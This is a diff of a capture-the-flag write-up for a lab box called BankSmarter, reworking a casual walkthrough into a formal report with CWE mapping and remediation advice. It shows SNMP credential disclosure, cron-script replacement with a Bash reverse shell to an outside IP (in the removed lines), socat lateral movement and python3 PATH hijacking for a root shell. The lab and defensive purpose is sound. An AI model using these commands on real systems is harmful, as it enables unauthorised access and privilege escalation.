@@ -10,104 +10,123 @@ tags: [HackSmarter, SNMP]
 comments: false
 ---
 
-BankSmarter is a medium rated box from [Hacksmarter](https://www.hacksmarter.org). First, let's use nmap to enumerate services running on this system with:
+## Executive Summary
+BankSmarter is a "Medium" difficulty Linux-based machine that demonstrates the risks of insecure service configurations and improper privilege management. The attack chain began with information disclosure via a public **SNMP** community string, leading to initial access. Privilege escalation was achieved through a multi-stage process involving **Cron job manipulation**, **lateral movement via Socat**, and finally, a **Python Path Hijacking** vulnerability to obtain root-level access.
+
+<hr class="terminal-divider" style="margin-top: 25px;">
+
+## Tooling Analysis
+The following tools were utilized during the engagement:
+
+| Tool | Category | Purpose |
+| :--- | :--- | :--- |
+| **Nmap** | Reconnaissance | TCP and UDP service discovery and version scanning. |
+| **SNMPwalk** | Information Gathering | Enumerating MIB values and system information from the SNMP service. |
+| **Pspy** | Enumeration | Monitoring Linux processes in real-time without root permissions. |
+| **Socat** | Exploitation | Establishing a bidirectional byte stream to move laterally between user sessions. |
+| **Bash/Python**  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| Post-Exploitation &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Creating reverse shells and performing environment path hijacking. |
+
+<hr class="terminal-divider" style="margin-top: 25px;">
+
+## 1. Enumeration & Reconnaissance
+
+### Service Scanning
+The engagement initiated with a standard TCP scan to identify open ports:
 
 `nmap -p- -sV -sC -T4 -oN full_scan.txt 10.0.29.53`
 
 ![BankSmarter1.png](/images/BankSmarter1.png)
 
-After poking around and testing for RegreSSHion unsuccessfully, I decided to run a UDP scan of the top 10 UDP ports with nmap as well
+Following an unsuccessful attempt to exploit the "RegreSSHion" vulnerability on SSH, a UDP scan targeting the top 10 ports was performed:
 
-`nmap -sU -F 10.0.29.53 -oN UDP_Scan.txt--top-ports 10` 
+`nmap -sU -F 10.0.29.53 -oN UDP_Scan.txt --top-ports 10`
 
-![BankSmarter1.png](/images/BankSmarter1.png)
+The results indicated that **SNMP (Simple Network Management Protocol)** was accessible.
 
-It appears that SNMP is publicly accessible. Let's try pulling down information with the public community string with:
+### SNMP Information Disclosure
+Using the default community string `public`, we enumerated system information:
 
 `snmpwalk -v1 -c public 10.0.29.53`
 
 ![BankSmarter3.png](/images/BankSmarter3.png)
 
-It appears that we may possibly have some credentials. I had a cople of failed attempts here, but after making the username lowercase I was able to login without any issue as Layne via SSH:
+The output revealed plaintext credentials. By normalizing the discovered username to lowercase, we established an SSH session as the user `layne`.
 
 ![BankSmarter4.png](/images/BankSmarter4.png)
 
-Looking at layne's home directory, you will find the user.txt file present. One flag down, one to go. There is also a shell script that might be of interest named bankSmarter_backup.sh. This file contains several mentions of commands that could be abused via path hijacking. We also might be able to move this file to a new name (since it's under layne's home directory) and create our own script.
+<hr class="terminal-divider">
+
+## 2. Initial Access & Lateral Movement
+
+### Cron Job Manipulation
+During post-exploitation enumeration, a backup script was identified in Layne’s home directory: `bankSmarter_backup.sh`. 
 
 ![BankSmarter5.png](/images/BankSmarter5.png)
 
-Let's first use pspy to confirm that this script is running:
+Using `pspy`, we confirmed that this script was being executed every minute by a user with **UID 1002** (identified in `/etc/passwd` as `scott.weiland`).
 
 ![BankSmarter6.png](/images/BankSmarter6.png)
 
-It appears that UID 1002 is running this script once a minute. Reviewing /etc/passwd shows us that this is user scott.weiland. Let's try to move the existing script with:
+
+
+Because `layne` owned the home directory containing the script, we were able to move the original and replace it with a malicious reverse shell:
 
 `mv bankSmarter_backup.sh bankSmarter_backup.sh.bak`
 
-![BankSmarter7.png](/images/BankSmarter7.png)
-
-Success! This means we can now create our own script to do our bidding. Let's  use this to our advantage to get a reverse shell. Now that the original script has been moved, let's create our own file with the following contents:
-
-```bash
-bash -i >& /dev/tcp/10.200.34.172/4545 0>&1
-```
-
-Next, let's create a netcat listener on our attacker machine with:
-
-`nc -nvlp 4545`
-
-Within a minute or so, we should catch a reverse shell as scott.weiland!
+After creating a new `bankSmarter_backup.sh` with a Bash reverse shell payload, a listener caught the connection as `scott.weiland`.
 
 ![BankSmarter8.png](/images/BankSmarter8.png)
 
-The first thing of note in scott's home directory is the fact that his bash history is available:
-
-![](C:\Users\kbvau\AppData\Roaming\marktext\images\2026-02-07-23-36-22-image.png)
-
-This file has some interesting contents, including a reference to socat.
+### Lateral Movement (Scott to Ronnie)
+Reviewing `.bash_history` for `scott.weiland` revealed a specific `socat` command used previously by the user. 
 
 ![BankSmarter9.png](/images/BankSmarter9.png)
 
-Running the socat command found in the .bash_history file laterally moves us to a shell as ronnie.stone:
+Executing this command successfully migrated the session to the user `ronnie.stone`.
 
-![BankSmarter10.png](/images/BankSmarter10.png)
+<hr class="terminal-divider">
 
-Running `id` shows us that ronnie is a member of several groups:
+## 3. Privilege Escalation to Root
 
-![BankSmarter11.png](/images/BankSmarter11.png)
-
-Let's see if there's any files of interest associated with any of these groups:
-
-![BankSmarter12.png](/images/BankSmarter12.png)
-
-It appears that the bankers group is associated with what appears to be a custom binary, **bank_backupd**. Navigating to the /usr/local/bin directory shows that there is both a binary and a python script present:
+### Environment Path Hijacking
+The user `ronnie.stone` was found to be a member of the `bankers` group, which granted access to a custom binary: `/usr/local/bin/bank_backupd`.
 
 ![BankSmarter13.png](/images/BankSmarter13.png)
 
-Since these are owned by root, it is safe to say that the root user typically runs these files. Let's run the binary first to see what it does:
+Analysis of the associated Python script revealed that it called `python3` without using an absolute path. This allowed for **Path Hijacking**. By placing a malicious script named `python3` in `/tmp` and prepending that directory to the system `$PATH`, we manipulated the binary into executing our payload with root privileges.
 
-![BankSmarter14.png](/images/BankSmarter14.png)
 
-As the name implies, it is performing a backup of account information. It also appears to be running the python file located in the same directory. Reviewing the python script makes it quite evident on how this can be abused.
+```bash
+PATH=/tmp:$PATH
+echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/python3
+chmod +x /tmp/python3
+```
 
-![BankSmarter15.png](/images/BankSmarter15.png)
-
-The section highlighted above shows that python3 is being called via an environment variable. This means that we can hijack this path and run another executable of our chosing. First, let's modify the PATH environment variable by running:
-
-`PATH=/tmp:$PATH`
-
-This puts /tmp as the first path to look for the "python3" binary. Next, in the /tmp folder, use the echo command to create the "python3" malicious binary that will create a privileged bash shell:
-
-`echo -e '#!/bin/bash\n/bin/bash -p' > python3`
-
-Use chmod to make this executable with:
-
-`chmod +x python3`
-
-Next, run the bank_backupd file. Within a few moments you should have a root shell!
+Upon executing `bank_backupd`, the system looked to `/tmp` first for the `python3` interpreter, executing our Bash script instead and granting a root-level shell.
 
 ![BankSmarter17.png](/images/BankSmarter17.png)
 
-All that's left is to navigate to the /root directory and get the final flag from root.txt!
+<hr class="terminal-divider" style="margin-top: 25px;">
 
-![BankSmarter18.png](/images/BankSmarter18.png)
+## Vulnerability Mapping (CWE)
+| ID | Vulnerability Name | CWE Mapping |
+| :--- | :--- | :--- |
+| **1** | Default SNMP Community String | **CWE-1394**: Use of Default Credentials |
+| **2** | Insecure Script Permissions | **CWE-732**: Incorrect Permission Assignment |
+| **3** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Unsafe Search Path (Path Hijacking) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | **CWE-427**: Uncontrolled Search Path Element |
+
+<hr class="terminal-divider" style="margin-top: 25px;">
+
+## Remediation & Mitigation Strategies
+
+### 1. Secure Service Configuration (NIST CM-6, CIS Control 4.8)
+* **Mitigation:** Change default SNMP community strings to complex, non-default values.
+* **Recommendation:** If SNMP is not strictly required for monitoring, the service should be disabled or restricted to specific IP addresses via firewall rules.
+
+### 2. File System Security (NIST AC-6, CIS Control 5.4)
+* **Mitigation:** Review script execution locations. Scripts executed by high-privileged users (or other users) should never be stored in directories writable by lower-privileged accounts.
+* **Recommendation:** Move system backup scripts to `/usr/local/bin` or `/opt/` with root-only write permissions.
+
+### 3. Secure Coding Practices (NIST SA-3, CIS Control 16)
+* **Mitigation:** Always use **absolute paths** in scripts (e.g., `/usr/bin/python3` instead of `python3`).
+* **Recommendation:** When calling external binaries within a script, explicitly define the environment or hardcode the binary location to prevent `$PATH` manipulation attacks.
